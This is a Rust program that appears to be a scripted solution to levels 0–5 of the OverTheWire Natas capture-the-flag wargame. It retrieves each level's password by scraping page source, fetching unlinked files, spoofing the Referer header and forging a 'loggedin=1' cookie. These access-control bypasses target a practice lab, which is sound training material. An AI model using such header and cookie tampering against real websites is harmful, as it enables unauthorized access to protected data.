use std::sync::Arc;

use regex::Regex;
use reqwest::{cookie, Client, Url};

#[tokio::main]
async fn main() -> Result<(),()> {
    let reg = Regex::new(r"[A-Za-z0-9]{32}").expect("Something went wrong");
    // level 0
    let username = "natas0";
    let password = "natas0";

    let url = format!("http://{}.natas.labs.overthewire.org", username);
    let client = Client::new();

    let webpage = client.post(url)
        .basic_auth(username, Some(password))
        .send()
        .await
        .unwrap();

    let data = webpage.text().await.unwrap();
    let result = reg.find(&data).unwrap();
    let level_one_password = result.as_str();
    println!("natas 1: {}", level_one_password);

    // Natas 1

    let username = "natas1";
    let url = format!("http://{}.natas.labs.overthewire.org", username);

    let lev_1_webpage = client.post(url)
        .basic_auth(username, Some(level_one_password))
        .send()
        .await
        .map_err(|error| {
            eprintln!("error: {}", error);
        })?;
    let lev_1_data = lev_1_webpage.text().await.unwrap();
    let lev_1_results = reg.find_iter(&lev_1_data).nth(1).unwrap();
    let level_two_password = lev_1_results.as_str();
    println!("natas 2: {}", level_two_password);

    // Natas 2
    let username = "natas2";
    let url = format!("http://{}.natas.labs.overthewire.org/files/users.txt", username);

    let lev_2_webpage = client.post(url)
        .basic_auth(username, Some(level_two_password))
        .send()
        .await
        .map_err(|error|{
            eprintln!("Error: {}", error);
        })?;

    let lev_2_data = lev_2_webpage.text().await.unwrap();
    let lev_2_result = reg.find(&lev_2_data).unwrap();
    let level_three_password = lev_2_result.as_str();
    println!("natas 3: {}", level_three_password);

    // natas 3
    let username = "natas3";
    let url = format!("http://{}.natas.labs.overthewire.org/s3cr3t/users.txt", username);

    let lev_3_webpage = client.post(url)
        .basic_auth(username, Some(level_three_password))
        .send()
        .await
        .unwrap();
    let lev_3_data = lev_3_webpage.text().await.unwrap();
    let lev_3_result = reg.find(&lev_3_data).unwrap();
    let level_four_password = lev_3_result.as_str();
    println!("natas 4: {}", level_four_password);

    // natas4
    let username = "natas4";
    let url = format!("http://{}.natas.labs.overthewire.org/", username);

    let lev_4_webpage = client.post(&url)
        .basic_auth(username, Some(level_four_password))
        .header("REFERER", "http://natas5.natas.labs.overthewire.org/")
        .send()
        .await
        .unwrap();
    let lev_4_data = lev_4_webpage.text().await.unwrap();
    let lev_4_result = reg.find_iter(&lev_4_data).nth(1).unwrap();
    let level_five_password = lev_4_result.as_str();
    println!("natas 5: {}", level_five_password);

    // natas 5
    let username = "natas5";
    let url = format!("http://{}.natas.labs.overthewire.org/", username);

    let parsed_url = Url::parse(&url).unwrap();
    let cookie = "loggedin=1";
    let jar = Arc::new(cookie::Jar::default());
    jar.add_cookie_str(cookie, &parsed_url);

    let client_cook = Client::builder()
        .cookie_store(true)
        .cookie_provider(Arc::clone(&jar))
        .build()
        .unwrap();

    let lev_5_webpage = client_cook.post(url)
        .basic_auth(username, Some(level_five_password))
        .send()
        .await
        .unwrap();
    let lev_5_data = lev_5_webpage.text().await.unwrap();
    let lev_5_results = reg.find_iter(&lev_5_data).nth(1).unwrap();
    let level_six_password = lev_5_results.as_str();
    println!("natas 6: {}", level_six_password);

    Ok(())
}

